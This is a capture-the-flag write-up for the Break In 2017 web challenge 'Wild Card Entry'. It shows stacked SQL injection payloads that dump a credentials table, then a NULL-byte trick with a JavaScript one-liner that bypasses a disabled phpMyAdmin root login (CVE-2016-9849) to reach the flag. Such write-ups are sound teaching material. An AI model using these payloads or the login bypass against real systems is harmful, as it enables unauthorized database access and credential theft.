# Break In 2017 - Wild Card Entry!


**Category:** Web
**Points:** 100
**Solves:** (TODO)
**Description:**

> Unfortunately, Animesh, even after repetitive efforts, could not get the final invitation to his friend Saumya's birthday party.
> But Animesh did not stop here. He came to know from Anjali (who is attending Saumya's birthday party) that there is a wild card entry in the party, but the key required for that is not known by anyone except Saumya.
> Now interestingly Saumya had kept the details of people coming to the party in a database. Now Animesh tries his luck for the last time to get the 'wild card key' required for the birthday party.

> Can you help Animesh in his last attempt? 

> It is known that Saumya usually checks the details of people coming to the party from: [here](https://felicity.iiit.ac.in/contest/extra/getans/)

## Write-up

by [ironmaniiith](https://github.com/ironmaniiith)

The given link redirects you to a page where when you enter the name of Saumya's friend, give you the details of that particular friend after retrieving it from database. You have to perform an SQL Injection here in order to get the name of a the required table which contains the further detail to solve the question. We had delibrately enabled execution of multiple queries in this. Hence when you submit the query:
```sql
"; show tables;
```
You get to know that there are two tables by the name of `birthday_invite` and `credentials`

Now just enter the query
```sql
"; describe credentials; select * from credentials;
```
And you can see the output
```
username varchar(80) YES
password varchar(80) YES
linktourl varchar(80) YES

root
a64ff1355b8b40f76bc265659eaf680e
https://felicity.iiit.ac.in/contest/extra/phpmyadmin/
```
Clearly the username and password are `root` and `a64ff1355b8b40f76bc265659eaf680e`
Now when you visit the link obtained after SQL Injection, you get a phpMyAdmin page. Interestingly when you enter the above credentials (username and password), you get an unusual error of "Access denied!". Here we had manually disabled the root login which results into the given error.

The solution to this is based on a very new exploit of phpMyAdmin, the further details of which can be found [here](https://www.cvedetails.com/vulnerability-list/vendor_id-784/cvssscoremin-7/cvssscoremax-7.99/Phpmyadmin.html), [#2](https://www.cvedetails.com/cve/CVE-2016-9849/)

Thus when you enter a `NULL` character after `root` in the username, and try to login, you can see that the "Access Denied" error goes and you can successfully login into phpMyAdmin.

Adding NULL character can be done using the following JavaScript
```javascript
document.getElementById('input_username').value = 'root\0'
```

Once you are logged in, you see a database by the name of `useful_info`. Just go the table get_flag inside it and you can see the entry: the_flag_is_07f663cbd03849d23e177a9348058722

Clearly the flag is `07f663cbd03849d23e177a9348058722`
## Other write-ups and resources
* https://github.com/USCGA/writeups/tree/master/online_ctfs/breakin_2017/wild_card_entry
